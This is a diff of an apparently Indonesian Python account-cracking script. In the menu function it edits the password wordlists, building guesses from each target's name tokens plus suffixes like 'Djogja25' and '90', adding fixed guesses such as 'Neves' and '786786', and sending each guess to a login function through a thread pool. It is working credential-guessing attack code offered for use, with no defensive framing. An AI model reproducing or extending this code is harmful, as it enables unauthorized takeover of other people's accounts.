@@ -216,7 +216,7 @@ def pilih_menu():
                 for x in bb:
                     litpas=[
                          str(x) + '90',
-                         str(x) + '91',
+                         str(x) + 'Djogja25',
                          str(x) + '92',
                          str(x) + '93'
                          ]
@@ -250,7 +250,7 @@ def pilih_menu():
                 for x in bb:
                     litpas=[
                          str(x) + '90',
-                         str(x) + '91',
+                         str(x) + 'Djogja25',
                          str(x) + '92',
                          str(x) + '93'
                          ]
@@ -281,15 +281,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '909090',
-                           str(x) + '919191',
+                           str(x) + '90',
+                           str(x) + 'Djogja25',
                            str(x) + '929292',
                            str(x) + '939393'
                            ]
-                      litpas.append('ximenesximenesximenes')
-                      litpas.append('XimenesXimenesXimenes')
-                      litpas.append('NevesNevesNeves')
-                      litpas.append('AquariusAquariusAquarius')
+                      litpas.append('ximenes')
+                      litpas.append('Ximenes')
+                      litpas.append('Neves')
+                      litpas.append('Aquarius')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -306,15 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '9090',
-                           str(x) + '9191',
-                           str(x) + '9292',
-                           str(x) + '9393'
+                           str(x) + '90',
+                           str(x) + 'Djogja25',
+                           str(x) + '92',
+                           str(x) + '93'
                            ]
-                      litpas.append('ximenesximenes')
-                      litpas.append('XimenesXimenes')
-                      litpas.append('NevesNeves')
-                      litpas.append('AquariusAquarius')
+                      litpas.append('ximenes')
+                      litpas.append('Ximenes')
+                      litpas.append('Neves')
+                      litpas.append('Aquarius')
                       litpas.append('786786')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
@@ -332,7 +332,7 @@ def pilih_menu():
                   for x in bb:
                       litpas=[
                            str(x) + '90',
-                           str(x) + '91',
+                           str(x) + 'Djogja25',
                            str(x) + '92',
                            str(x) + '93'
                            ]
@@ -356,7 +356,7 @@ def pilih_menu():
                   for x in bb:
                       litpas=[
                            str(x) + '90',
-                           str(x) + '91',
+                           str(x) + 'Djogja25',
                            str(x) + '92',
                            str(x) + '93'
                            ]
